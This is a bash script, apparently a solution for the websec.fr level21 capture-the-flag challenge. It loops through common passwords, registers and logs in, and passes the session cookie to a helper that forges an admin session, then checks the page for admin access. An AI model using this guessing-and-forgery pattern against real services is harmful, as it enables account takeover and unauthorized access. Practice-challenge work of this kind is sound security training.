#!/usr/bin/env bash
set -euo pipefail

# Usage: guess_admin.sh [timeout]
TIMEOUT="${1:-15s}"
ROOT="/workspace/websec/level21"
OUT_DIR="$ROOT/outputs"
SCRIPTS_DIR="$ROOT/scripts"

USER6="abcdef"

declare -a CANDIDATES=(
  admin
  password
  123456
  websec
  level21
  patpat
  icernica
  root
  toor
)

for PW in "${CANDIDATES[@]}"; do
  echo "[+] Trying candidate password: $PW" | cat
  rm -f "$OUT_DIR/cookies.txt"
  /usr/bin/timeout "$TIMEOUT" curl -sS -L \
    -c "$OUT_DIR/cookies.txt" -b "$OUT_DIR/cookies.txt" \
    -d "username=$USER6" -d "password=$PW" -d register=Register \
    https://websec.fr/level21/index.php >/dev/null || true

  /usr/bin/timeout "$TIMEOUT" curl -sS -L \
    -c "$OUT_DIR/cookies.txt" -b "$OUT_DIR/cookies.txt" \
    -d "username=$USER6" -d "password=$PW" -d login=Login \
    https://websec.fr/level21/index.php -o "$OUT_DIR/page_login.html" || continue

  COOKIE=$(awk '!/^#/ && NF>=7 && $6=="session" {print $7}' "$OUT_DIR/cookies.txt" | tail -n1 || true)
  if [[ -z "${COOKIE:-}" ]]; then
    echo "[-] No session cookie after login" | cat
    continue
  fi

  FORGED=$(python3 "$SCRIPTS_DIR/forge_admin_only.py" "$USER6" "$COOKIE")
  /usr/bin/timeout "$TIMEOUT" curl -sS -L -H "Cookie: session=$FORGED" \
    https://websec.fr/level21/index.php -o "$OUT_DIR/flag_guess_${PW}.html" || true

  if grep -qi "Hello admin" "$OUT_DIR/flag_guess_${PW}.html"; then
    echo "[+] SUCCESS with password: $PW" | cat
    grep -n "Hello admin" "$OUT_DIR/flag_guess_${PW}.html" | cat
    exit 0
  fi
done

echo "[-] No candidate succeeded." | cat
exit 1

